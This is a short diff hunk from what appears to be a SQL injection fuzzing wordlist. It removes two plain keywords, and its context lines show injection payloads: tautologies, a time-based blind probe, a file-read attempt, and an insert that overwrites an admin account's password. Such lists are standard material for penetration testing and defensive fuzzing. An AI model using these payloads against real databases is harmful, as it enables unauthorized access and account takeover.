@@ -716,8 +716,6 @@ and 1=( if((load_file(char(110,46,101,120,11 ...
 and 1=1
 and 1=1–
 anything' OR 'x'='x
-as
-asc
 attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
 begin
 benchmark(10000000,MD5(1))#
